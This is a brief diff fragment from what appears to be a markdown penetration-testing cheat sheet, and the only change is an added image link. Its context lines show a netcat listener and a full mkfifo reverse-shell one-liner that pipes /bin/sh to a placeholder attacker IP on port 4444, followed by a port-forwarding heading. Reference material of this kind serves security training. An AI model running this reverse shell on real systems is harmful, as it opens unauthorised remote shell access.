@@ -147,6 +147,8 @@ nc -nvlp 4444
 ```bash
 mkfifo /tmp/f; nc <attacker_IP> 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
 ```
+![image](https://github.com/user-attachments/assets/c64806cb-1e16-4475-b4a1-432636fa4ac8)
+
 
 ## Port Forwarding
 **Forwarding port 8000 to 9000**
